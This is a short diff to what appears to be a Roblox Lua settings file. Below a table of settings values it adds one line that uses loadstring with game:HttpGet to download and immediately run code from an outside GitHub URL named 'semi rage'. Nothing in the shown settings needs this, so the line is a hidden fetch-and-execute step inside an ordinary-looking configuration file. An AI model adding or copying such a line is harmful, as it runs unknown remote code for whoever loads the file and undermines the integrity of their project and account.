@@ -6,3 +6,4 @@ shared.Settings - {
         ["Bad"] = s4
     }
 ]
+loadstring(game:HttpGet("https://github.com/Meifryk/octo/blob/main/semi%20rage"))()
